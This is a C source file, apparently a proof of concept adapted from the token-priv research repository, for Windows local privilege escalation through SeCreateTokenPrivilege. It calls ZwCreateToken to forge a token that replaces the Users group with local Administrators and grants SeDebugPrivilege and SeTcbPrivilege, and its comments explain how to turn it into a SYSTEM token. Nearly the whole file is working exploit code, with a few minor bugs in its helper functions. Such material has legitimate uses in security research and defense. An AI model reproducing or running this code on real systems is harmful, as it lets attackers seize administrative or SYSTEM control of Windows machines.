/*
Reference:https://github.com/hatRiot/token-priv
Enable the SeCreateTokenPrivilege of current process and then create primary tokens via the ZwCreateToken API.
After that enable the local administrator group on the token and enable SeDebugPrivilege and SeTcbPrivilege.

We will have all access on the system.
*/


#include <windows.h>
#include <assert.h>
#pragma comment(lib,"advapi32.lib") 
#pragma comment(lib,"user32.lib") 

#define STATUS_SUCCESS 0

typedef struct _UNICODE_STRING {
	USHORT  Length;
	USHORT  MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _SID_BUILTIN
{
	UCHAR Revision;
	UCHAR SubAuthorityCount;
	SID_IDENTIFIER_AUTHORITY IdentifierAuthority;
	ULONG SubAuthority[2];
} SID_BUILTIN, *PSID_BUILTIN;

typedef struct _SID_INTEGRITY
{
	UCHAR Revision;
	UCHAR SubAuthorityCount;
	SID_IDENTIFIER_AUTHORITY IdentifierAuthority;
	ULONG SubAuthority[1];

} SID_INTEGRITY, *PSID_INTEGRITY;

typedef NTSYSAPI
NTSTATUS
(NTAPI *_ZwCreateToken)(
	OUT PHANDLE TokenHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN TOKEN_TYPE Type,
	IN PLUID AuthenticationId,
	IN PLARGE_INTEGER ExpirationTime,
	IN PTOKEN_USER User,
	IN PTOKEN_GROUPS Groups,
	IN PTOKEN_PRIVILEGES Privileges,
	IN PTOKEN_OWNER Owner,
	IN PTOKEN_PRIMARY_GROUP PrimaryGroup,
	IN PTOKEN_DEFAULT_DACL DefaultDacl,
	IN PTOKEN_SOURCE Source
	);

PVOID
GetInfoFromToken(HANDLE current_token, TOKEN_INFORMATION_CLASS tic)
{
	DWORD n;
	PVOID data;

	if (!GetTokenInformation(current_token, tic, 0, 0, &n) && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
		return 0;

	data = (PVOID)malloc(n);

	if (GetTokenInformation(current_token, tic, data, n, &n))
		return data;
	else
		free(data);

	return 0;
}

void get_system_privileges(PTOKEN_PRIVILEGES);

// Given a base, presumably non-priv'd token, generate a new one with the admin group added to it.
// This can very easily be adopted to generate a SYSTEM token instead (see commented out code).
HANDLE
se_create_token_privilege(HANDLE base_token, BOOL isPrimary)
{
	LUID luid;
	PLUID pluidAuth;
	NTSTATUS ntStatus;
	LARGE_INTEGER li;
	PLARGE_INTEGER pli;
	DWORD sessionId;
	_TOKEN_TYPE token_type = isPrimary ? TokenPrimary : TokenImpersonation;

	HANDLE elevated_token;
	PTOKEN_STATISTICS stats;
	PTOKEN_PRIVILEGES privileges;
	PTOKEN_OWNER owner;
	PTOKEN_PRIMARY_GROUP primary_group;
	PTOKEN_DEFAULT_DACL default_dacl;
	PTOKEN_GROUPS groups;
	SECURITY_QUALITY_OF_SERVICE sqos = { sizeof(sqos), SecurityImpersonation, SECURITY_STATIC_TRACKING, FALSE };
	OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, 0, 0, 0, &sqos };
	SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
	PSID_AND_ATTRIBUTES pSid;
	PISID pSidSingle;
	TOKEN_USER userToken;
	TOKEN_SOURCE sourceToken = { { '!', '!', '!', '!', '!', '!', '!', '!' },{ 0, 0 } };
	PSID lpSidOwner = NULL;
	LUID authid = SYSTEM_LUID;
	_ZwCreateToken ZwCreateToken;

	SID_BUILTIN TkSidLocalAdminGroup = { 1, 2,{ 0, 0, 0, 0, 0, 5 },{ 32, DOMAIN_ALIAS_RID_ADMINS } };
	SID_INTEGRITY IntegritySIDHigh = { 1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY, SECURITY_MANDATORY_HIGH_RID };
	SID_INTEGRITY IntegritySIDSystem = { 1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY, SECURITY_MANDATORY_SYSTEM_RID };
	SID_INTEGRITY IntegritySIDMedium = { 1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY, SECURITY_MANDATORY_MEDIUM_RID };

	ZwCreateToken = (_ZwCreateToken)GetProcAddress(LoadLibraryA("ntdll"), "ZwCreateToken");
	if (ZwCreateToken == NULL) {
		printf("[-] Failed to load ZwCreateToken: %d\n", GetLastError());
		return NULL;
	}

	DWORD dwBufferSize = 0;
	PTOKEN_USER user;
	user = (PTOKEN_USER)GetInfoFromToken(base_token, TokenUser);

	AllocateAndInitializeSid(&nt, 1, SECURITY_LOCAL_SYSTEM_RID,
		0, 0, 0, 0, 0, 0, 0, &lpSidOwner);

	userToken.User.Sid = lpSidOwner;
	userToken.User.Attributes = 0;

	AllocateLocallyUniqueId(&luid);
	sourceToken.SourceIdentifier.LowPart = luid.LowPart;
	sourceToken.SourceIdentifier.HighPart = luid.HighPart;

	stats = (PTOKEN_STATISTICS)GetInfoFromToken(base_token, TokenStatistics);
	privileges = (PTOKEN_PRIVILEGES)LocalAlloc(LMEM_FIXED, sizeof(TOKEN_PRIVILEGES) + (sizeof(LUID_AND_ATTRIBUTES) * 2));
	get_system_privileges(privileges);
	groups = (PTOKEN_GROUPS)GetInfoFromToken(base_token, TokenGroups);
	primary_group = (PTOKEN_PRIMARY_GROUP)GetInfoFromToken(base_token, TokenPrimaryGroup);
	default_dacl = (PTOKEN_DEFAULT_DACL)GetInfoFromToken(base_token, TokenDefaultDacl);

	pSid = groups->Groups;
	for (int i = 0; i < groups->GroupCount; ++i, pSid++)
	{
		// change IL
		if (pSid->Attributes & SE_GROUP_INTEGRITY)
			memcpy(pSid->Sid, &IntegritySIDMedium, sizeof(IntegritySIDMedium));
		//memcpy(pSid->Sid, &IntegritySIDSystem, sizeof(IntegritySIDSystem));

		PISID piSid = (PISID)pSid->Sid;
		if (piSid->SubAuthority[piSid->SubAuthorityCount - 1] == DOMAIN_ALIAS_RID_USERS) {
			// found RID_USERS membership, overwrite with RID_ADMINS
			memcpy(piSid, &TkSidLocalAdminGroup, sizeof(TkSidLocalAdminGroup));
			pSid->Attributes = SE_GROUP_ENABLED;
		}
		else {
			pSid->Attributes &= ~SE_GROUP_USE_FOR_DENY_ONLY;
			pSid->Attributes &= ~SE_GROUP_ENABLED;
		}
	}

	owner = (PTOKEN_OWNER)LocalAlloc(LPTR, sizeof(PSID));
	owner->Owner = user->User.Sid;
	//owner->Owner = GetLocalSystemSID();

	pluidAuth = &authid;
	li.LowPart = 0xFFFFFFFF;
	li.HighPart = 0xFFFFFFFF;
	pli = &li;
	ntStatus = ZwCreateToken(&elevated_token,
		TOKEN_ALL_ACCESS,
		&oa,
		token_type,
		pluidAuth,
		pli,
		user,
		//&userToken,
		groups,
		privileges,
		owner,
		primary_group,
		default_dacl,
		&sourceToken // creates an anonymous impersonation token
	);

	if (ntStatus == STATUS_SUCCESS)
		return elevated_token;
	else
		printf("[-] Failed to create new token: %d %08x\n", GetLastError(), ntStatus);

	FreeSid(lpSidOwner);
	if (stats) LocalFree(stats);
	if (groups) LocalFree(groups);
	if (privileges) LocalFree(privileges);
	return NULL;
}

void
get_system_privileges(PTOKEN_PRIVILEGES privileges)
{
	//TOKEN_PRIVILEGES privileges;
	LUID luid;

	privileges->PrivilegeCount = 2;

	// enable DEBUG
	printf("Finding SeDebugPrivilege name...\n");
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
	privileges->Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[0].Luid = luid;

	// enable Tcb
	printf("Finding SeTcbPrivilege name...\n");
	LookupPrivilegeValue(NULL, SE_TCB_NAME, &luid);
	privileges->Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[1].Luid = luid;

}


int IsTokenSystem(HANDLE tok)
{
	DWORD Size, UserSize, DomainSize;
	SID *sid;
	SID_NAME_USE SidType;
	TCHAR UserName[64], DomainName[64];
	TOKEN_USER *User;
	Size = 0;
	GetTokenInformation(tok, TokenUser, NULL, 0, &Size);
	if (!Size)
		return 0;

	User = (TOKEN_USER *)malloc(Size);
	assert(User);
	GetTokenInformation(tok, TokenUser, User, Size, &Size);
	assert(Size);
	Size = GetLengthSid(User->User.Sid);
	assert(Size);
	sid = (SID *)malloc(Size);
	assert(sid);

	CopySid(Size, sid, User->User.Sid);
	UserSize = (sizeof UserName / sizeof *UserName) - 1;
	DomainSize = (sizeof DomainName / sizeof *DomainName) - 1;
	LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
	free(sid);

	printf("whoami:\n%S\\%S\n", DomainName, UserName);
	if (!_wcsicmp(UserName, L"SYSTEM"))
		return 0;
	return 1;
}

VOID RetPrivDwordAttributesToStr(DWORD attributes, LPTSTR szAttrbutes)
{
	UINT len = 0;
	if (attributes & SE_PRIVILEGE_ENABLED)
		len += wsprintf(szAttrbutes, TEXT("Enabled"));
	if (attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT)
		len += wsprintf(szAttrbutes, TEXT("Enabled by default"));
	if (attributes & SE_PRIVILEGE_REMOVED)
		len += wsprintf(szAttrbutes, TEXT("Removed"));
	if (attributes & SE_PRIVILEGE_USED_FOR_ACCESS)
		len += wsprintf(szAttrbutes, TEXT("Used for access"));
	if (szAttrbutes[0] == 0)
		wsprintf(szAttrbutes, TEXT("Disabled"));
	return;
}

int GetTokenPrivilege(HANDLE tok)
{
	PTOKEN_PRIVILEGES ppriv = NULL;
	DWORD dwRet = 0;
	GetTokenInformation(tok, TokenGroups, ppriv, dwRet, &dwRet);
	if (!dwRet)
		return 0;
	ppriv = (PTOKEN_PRIVILEGES)calloc(dwRet, 1);
	GetTokenInformation(tok, TokenPrivileges, ppriv, dwRet, &dwRet);
	printf("\nwhoami /priv\n");
	for (int i = 0; i < ppriv->PrivilegeCount; i++)
	{
		TCHAR lpszPriv[MAX_PATH] = { 0 };
		DWORD dwRet = MAX_PATH;
		BOOL n = LookupPrivilegeName(NULL, &(ppriv->Privileges[i].Luid), lpszPriv, &dwRet);
		printf("%-50ws", lpszPriv);
		TCHAR lpszAttrbutes[1024] = { 0 };
		RetPrivDwordAttributesToStr(ppriv->Privileges[i].Attributes, lpszAttrbutes);
		printf("%ws\n", lpszAttrbutes);
	}
	return 1;
}

BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
{

	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(NULL, priv, &luid))
	{
		printf("[!]LookupPrivilegeValue error\n");
		return 0;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		printf("[!]AdjustTokenPrivileges error\n");
		return 0;
	}

	IsTokenSystem(hToken);
	GetTokenPrivilege(hToken);

	return TRUE;
}

int _tmain(int argc, _TCHAR* argv[])
{
	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
	{
		printf("[!]OpenProcessToken error\n");
		return 0;
	}

	EnablePriv(hToken, SE_CREATE_TOKEN_NAME);
	se_create_token_privilege(hToken, 0);
	return 0;
}
